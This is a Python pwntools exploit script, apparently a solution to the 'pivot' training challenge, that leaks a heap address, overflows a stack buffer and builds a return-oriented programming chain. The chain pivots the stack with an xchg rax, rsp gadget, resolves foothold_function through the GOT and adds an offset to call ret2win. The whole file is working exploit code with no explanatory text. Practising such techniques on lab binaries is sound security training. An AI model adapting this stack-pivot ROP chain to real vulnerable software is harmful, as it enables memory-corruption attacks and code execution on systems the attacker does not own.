#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./pivot")
elf = ELF("./pivot")
libc = ELF("./libpivot.so")
pop_rdi = 0x400b73
pop_rax = 0x400b00
mov_rax_rax = 0x400b05
add_rax_rbp = 0x400b09
leave_ret = 0x400ae0
call_rax = 0x40098e
xchg_rax_rsp = 0x400B02
pop_rbp = 0x00400900

p.recvuntil(": ")
pivot = int(p.recv(14), 16)
log.info("addr : "+hex(pivot))

gdb.attach(p)
# ret2win
pay = p64(elf.plt['foothold_function'])
pay += p64(pop_rax) + p64(elf.got['foothold_function'])
pay += p64(mov_rax_rax)
pay += p64(pop_rbp) + p64(0x14e)
pay += p64(add_rax_rbp)
pay += p64(call_rax)

p.sendlineafter("> ", pay)


pay = 'A'*(0x20+0x8)
pay += p64(pop_rax) + p64(pivot)
pay += p64(xchg_rax_rsp)

p.sendlineafter("> ", pay)


p.interactive()

